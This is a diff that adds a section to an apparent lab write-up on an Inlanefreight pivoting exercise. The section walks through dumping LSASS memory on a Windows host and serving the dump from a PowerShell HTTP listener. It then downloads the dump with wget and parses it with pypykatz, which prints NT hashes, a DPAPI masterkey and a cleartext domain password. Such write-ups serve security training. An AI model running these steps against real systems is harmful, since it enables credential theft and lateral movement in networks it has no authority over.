@@ -540,3 +540,116 @@ xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
 After successfully connecting via RDP, I navigated through the file system to locate and retrieve the flag.
 
 [![Screenshot-2025-03-10-103351.png](https://i.postimg.cc/503jB92f/Screenshot-2025-03-10-103351.png)](https://postimg.cc/JDs1mLXF)
+
+* **In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?**
+
+The hint mentioned investigating LSASS, so I proceeded to create a memory dump of the lsass.exe process. On the target machine (via RDP), I did the following:
+
+-Opened Task Manager.
+-Navigated to the Processes tab.
+-Located Local Security Authority Process (lsass.exe).
+-Right-clicked and selected Create dump file.
+
+This created a file named lsass.DMP, saved at C:\Users\mlefay\AppData\Local\Temp
+
+Since lsass.DMP was on the remote host, I needed a simple way to transfer it to my machine. I set up a basic HTTP server on the Windows target using PowerShell.
+
+```c
+ $listener = [System.Net.HttpListener]::new()
+>> $listener.Prefixes.Add("http://+:8000/")
+>> $listener.Start()
+>> Write-Host "HTTP server started on port 8000. Press Ctrl+C to stop."
+>> while ($listener.IsListening) {
+>>     $context = $listener.GetContext()
+>>     $response = $context.Response
+>>     $file = "C:\Users\mlefay\AppData\Local\Temp\lsass.DMP"
+>>     if (Test-Path $file) {
+>>         $bytes = [System.IO.File]::ReadAllBytes($file)
+>>         $response.ContentLength64 = $bytes.Length
+>>         $response.OutputStream.Write($bytes, 0, $bytes.Length)
+>>     } else {
+>>         $errorMsg = "File not found."
+>>         $errorBytes = [System.Text.Encoding]::UTF8.GetBytes($errorMsg)
+>>         $response.ContentLength64 = $errorBytes.Length
+>>         $response.OutputStream.Write($errorBytes, 0, $errorBytes.Length)
+>>     }
+>>     $response.OutputStream.Close()
+>> }
+HTTP server started on port 8000. Press Ctrl+C to stop.
+
+```
+**This starts an HTTP listener on port 8000 that serves up the lsass.DMP file.**
+
+On my attack machine, I downloaded the file using wget:
+
+```c
+ wget http://172.16.5.35:8000/lsass.DMP -O lsass.DMP
+--2025-03-10 10:00:47--  http://172.16.5.35:8000/lsass.DMP
+Connecting to 172.16.5.35:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 45636356 (44M)
+Saving to: ‘lsass.DMP’
+
+lsass.DMP           100%[===================>]  43.52M  2.12MB/s    in 17s     
+
+2025-03-10 10:01:03 (2.61 MB/s) - ‘lsass.DMP’ saved [45636356/45636356]
+```
+
+[![Screenshot-2025-03-10-110218.png](https://i.postimg.cc/wMFktdmr/Screenshot-2025-03-10-110218.png)](https://postimg.cc/xNJm7hgG)
+
+With the dump file on hand, I used pypykatz to parse it and extract credentials:
+
+```c
+pypykatz lsa minidump lsass.DMP 
+```
+
+The results showed several user sessions, including cleartext credentials for the vfrank user account
+```c
+= LogonSession ==
+authentication_id 163081 (27d09)
+session_id 0
+username vfrank
+domainname INLANEFREIGHT
+logon_server ACADEMY-PIVOT-D
+logon_time 2025-03-10T14:28:03.019395+00:00
+sid S-1-5-21-3858284412-1730064152-742000644-1103
+luid 163081
+	== MSV ==
+		Username: vfrank
+		Domain: INLANEFREIGHT
+		LM: NA
+		NT: 2e16a00be74fa0bf862b4256d0347e83
+		SHA1: b055c7614a5520ea0fc1184ac02c88096e447e0b
+		DPAPI: 97ead6d940822b2c57b18885ffcc5fb400000000
+	== WDIGEST [27d09]==
+		username vfrank
+		domainname INLANEFREIGHT
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: vfrank
+		Domain: INLANEFREIGHT.LOCAL
+		Password: Imply wet Unmasked!
+		password (hex)49006d0070006c0079002000770065007400200055006e006d00610073006b006500640021000000
+	== WDIGEST [27d09]==
+		username vfrank
+		domainname INLANEFREIGHT
+		password None
+		password (hex)
+	== DPAPI [27d09]==
+		luid 163081
+		key_guid 560f4286-76f2-4f0f-90a9-5135bbc0104f
+		masterkey 4fc3adb204f30f6a226f637b66be93811cee121eaed0e4ec2e8bc023d2d38d396e0c4e827aa49c6b1c2a58f6428ca725be027497ad10f8dd386d5926e7bf73b7
+		sha1_masterkey a3e3a61d9a74541a56c3a822d5470bedbb2d4fb5
+
+== LogonSession ==
+authentication_id 997 (3e5)
+session_id 0
+username LOCAL SERVICE
+domainname NT AUTHORITY
+logon_server 
+logon_time 2025-03-10T14:27:36.863138+00:00
+sid S-1-5-19
+luid 997
+```
+[![Screenshot-2025-03-10-112638.png](https://i.postimg.cc/RZWT0yVP/Screenshot-2025-03-10-112638.png)](https://postimg.cc/5XMz7Pzv)
